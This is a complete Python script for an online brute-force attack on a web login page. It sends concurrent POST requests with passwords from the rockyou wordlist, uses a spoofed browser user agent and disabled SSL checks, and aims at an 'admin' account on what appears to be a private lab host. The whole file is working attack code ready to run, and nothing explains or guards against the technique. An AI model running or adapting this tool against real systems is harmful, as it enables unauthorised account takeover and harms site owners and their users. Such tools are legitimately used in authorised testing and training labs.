
import asyncio
import aiohttp
from colorama import init, Fore
from tqdm.asyncio import tqdm

# Initialize colorama for color handling in the terminal
init(autoreset=True)

# Colors for terminal output
GREEN = Fore.GREEN
RED = Fore.RED
YELLOW = Fore.YELLOW


class PasswordGuesser:

    def __init__(self, target_url, username, wordlist_path, action_type, timeout=5, verify_ssl=False):
        self.target_url = target_url
        self.username = username
        self.wordlist_path = wordlist_path
        self.action_type = action_type
        self.timeout = timeout
        self.verify_ssl = verify_ssl
        self.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36"

    async def run_guess(self):

        passwords = self.load_passwords()
        semaphore = asyncio.Semaphore(20)
        async with aiohttp.ClientSession(
            headers={'User-Agent': self.user_agent},
            connector=aiohttp.TCPConnector(ssl=self.verify_ssl)
        ) as session:
            tasks = []
            for password in tqdm(passwords[:1000], desc="Trying passwords", unit="password"):
                task = asyncio.create_task(self.try_password(session, password, semaphore))
                tasks.append(task)
            results = await asyncio.gather(*tasks)
            # Print if a valid password was found
            if any(results):
                print(f"{GREEN} [+] Password found: {next((res for res in results if res), 'No password found')}{Fore.RESET}")
            else:
                print(f"{RED} [-] No valid passwords found.{Fore.RESET}")

    async def try_password(self, session, password, semaphore):

        async with semaphore:
            try:
                parameters = {"login": self.username, "password": password, "form": self.action_type}
                response = await session.post(self.target_url, data=parameters, timeout=aiohttp.ClientTimeout(total=self.timeout))
                content = await response.text()
                if 'Invalid credentials or user not activated'.lower() not in content.lower():
                    return password
            except Exception as e:
                print(f"Error trying password {password}: {e}")
            return None

    def load_passwords(self):

        # Load passwords from the wordlist file
        with open(self.wordlist_path, 'r', encoding='latin-1') as file:
            return [line.strip() for line in file]

    def start_guessing(self):

        print(f"{YELLOW}Starting the password guessing process against '{self.target_url}' with user '{self.username}'{Fore.RESET}")
        asyncio.run(self.run_guess())

if __name__ == "__main__":
    # Initialize PasswordGuesser with the required parameters and start the guessing process
    guesser = PasswordGuesser(
        target_url="http://192.168.138.129:8080/login.php",
        username="admin",
        wordlist_path="/usr/share/wordlists/rockyou.txt",
        action_type="submit",
        verify_ssl=False
    )
    guesser.start_guessing()
